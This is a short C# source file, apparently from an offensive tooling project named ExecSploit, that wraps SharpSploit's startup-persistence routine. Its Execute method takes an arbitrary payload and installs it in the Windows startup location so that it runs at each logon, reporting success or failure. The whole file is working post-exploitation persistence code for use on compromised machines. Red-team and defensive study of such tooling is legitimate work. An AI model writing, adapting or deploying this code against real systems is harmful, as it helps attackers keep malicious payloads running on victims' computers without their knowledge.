using System;

using SharpSploit.Persistence;

namespace ExecSploit
{
    public static class PersistStartup
    {
        public static string Execute(string Payload, string FileName = "")
        {
            try
            {
                if (Startup.InstallStartup(Payload, FileName))
                {
                    return "Startup Persistence suceeded for: " + FileName;
                }
                return "Startup Persistence failed for: " + FileName;
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}